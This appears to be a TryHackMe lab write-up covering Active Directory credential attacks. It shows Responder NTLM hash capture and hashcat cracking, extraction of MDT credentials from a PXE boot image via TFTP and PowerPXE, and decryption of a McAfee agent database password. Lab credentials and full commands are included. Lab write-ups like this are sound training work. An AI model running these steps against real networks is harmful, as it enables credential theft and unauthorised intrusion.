---
tags:
  - THM
  - AD
  - Pentesting
---
## Task 5

> responder

```
git clone https://github.com/lgandx/Responder

sudo responder -I breachad
```

> svcFileCopy

```txt
svcFileCopy::ZA:fce88d3cb7c0285b:4C2C1735ACF6C3A70A230C6DE207F22A:010100000000000080D38CE7CBBCDA01AB3EDA71851860F500000000020008004C00470053004D0001001E00570049004E002D004C0035003800540034004D00450050004C005600340004003400570049004E002D004C0035003800540034004D00450050004C00560034002E004C00470053004D002E004C004F00430041004C00030014004C00470053004D002E004C004F00430041004C00050014004C00470053004D002E004C004F00430041004C000700080080D38CE7CBBCDA0106000400020000000800300030000000000000000000000000200000C4B9D9A64A968D03D48066BC7BC2DDEB1FDA85889181343F3C8AB9D58771774A0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00350033002E00320030000000000000000000
```

```bash
hashcat  -m 5600 hash.txt passwordlist.txt --force

SVCFILECOPY::ZA:fce88d3cb7c0285b:4c2c1735acf6c3a70a230c6de207f22a:010100000000000080d38ce7cbbcda01ab3eda71851860f500000000020008004c00470053004d0001001e00570049004e002d004c0035003800540034004d00450050004c005600340004003400570049004e002d004c0035003800540034004d00450050004c00560034002e004c00470053004d002e004c004f00430041004c00030014004c00470053004d002e004c004f00430041004c00050014004c00470053004d002e004c004f00430041004c000700080080d38ce7cbbcda0106000400020000000800300030000000000000000000000000200000c4b9d9a64a968d03d48066bc7bc2ddeb1fda85889181343f3c8ab9d58771774a0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00350030002e00350033002e00320030000000000000000000:FPassword1!


```

> FPassword1!

## Task 6

`ssh thm@THMJMP1.za.tryhackme.com`

Â `thm:Password1@`.

x64{E19F0973-7B12-4D29-82BF-2A02F7C91A79}.bcd

<http://pxeboot.za.tryhackme.com/>

THMMDT: 10.200.55.202

```ps
tftp -i 10.200.55.202 GET "\Tmp\x64{E19F0973-7B12-4D29-82BF-2A02F7C91A79}.bcd" conf.bcd
```

```powershell
Import-Module .\powerpxe\PowerPXE.ps1
$bcdfile = "conf.bcd"
Get-WimFile -bcdFile $bcdfile

>> Parse the BCD file: conf.bcd 
>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim 
\Boot\x64\Images\LiteTouchPE_x64.wim
```

```powershell
$wimfile = '\Boot\x64\Images\LiteTouchPE_x64.wim'
$mdtserver = (Resolve-DnsName thmmdt.za.tryhackme.com).IPAddress
tftp -i $mdtserver GEt "$wimfile" pxeboot.wim
```

```powershell
Get-FindCredentials -WimFile .\pxeboot.wim
```

> Finding Bootstrap.ini
>
>DeployRoot = \\THMMDT\MTDBuildLab$
>UserID = svcMDT
>UserDomain = ZA
>UserPassword = PXEBootSecure1@

## Task 7

```shell
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db ma.db
```

```shell
sqlite3 ./ma.db

# List the tables in the database
# Note the AGENT_REPOSITORIES table we're interested in
sqlite> .tables
AGENT_CHILD              AGENT_PROXIES            MA_DATACHANNEL_MESSAGES
AGENT_LOGS               AGENT_PROXY_CONFIG     
AGENT_PARENT             AGENT_REPOSITORIES


# Dump the table schema
# Note the column names
    # NAME
    # UNIQUE
    # REPO_TYPE
    # URL_TYPE
    # NAMESPACE
    # PROXY_USAGE
    # AUTH_TYPE
    # ENABLED
    # SERVER_FQDN
    # SERVER_IP
    # SERVER_NAME
    # PORT
    # SSL_PORT
    # DOMAIN
    # AUTH_USER
    # AUTH_PASSWD
    # IS_PASSWD_ENCRYPTED
    # PING_TIME
    # SUBNET_DISTANCE
    # SITELIST_ORDER
    # STATE
sqlite> .schema AGENT_REPOSITORIES
CREATE TABLE AGENT_REPOSITORIES(NAME TEXT NOT NULL UNIQUE, REPO_TYPE INTEGER NOT NULL, URL_TYPE INTEGER NOT NULL, NAMESPACE INTEGER NOT NULL, PROXY_USAGE INTEGER NOT NULL, AUTH_TYPE INTEGER NOT NULL, ENABLED INTEGER NOT NULL, SERVER_FQDN TEXT, SERVER_IP TEXT, SERVER_NAME TEXT,PORT INTEGER, SSL_PORT INTEGER,PATH TEXT, DOMAIN TEXT, AUTH_USER TEXT, AUTH_PASSWD TEXT, IS_PASSWD_ENCRYPTED INTEGER NOT NULL, PING_TIME INTEGER NOT NULL, SUBNET_DISTANCE INTEGER NOT NULL, SITELIST_ORDER INTEGER NOT NULL, STATE INTEGER NOT NULL, PRIMARY KEY (NAME) ON CONFLICT REPLACE);


# Select the desired columns from the table
sqlite> SELECT DOMAIN, AUTH_USER, AUTH_PASSWD FROM AGENT_REPOSITORIES ;
||
za.tryhackme.com|svcAV|jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==


# Exit sqlite3
sqlite> .quit
```

```shell
export enc_pw=jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
root@ip-10-10-95-143:~/Rooms/BreachingAD/task7# echo $enc_pw
jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==

unzip mcafeesitelistpwddecryption.zip 

python2 mcafee-sitelist-pwd-decryption-master/mcafee_sitelist_pwd_decrypt.py $enc_pw 
Crypted password   : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
Decrypted password : MyStrongPassword!
```
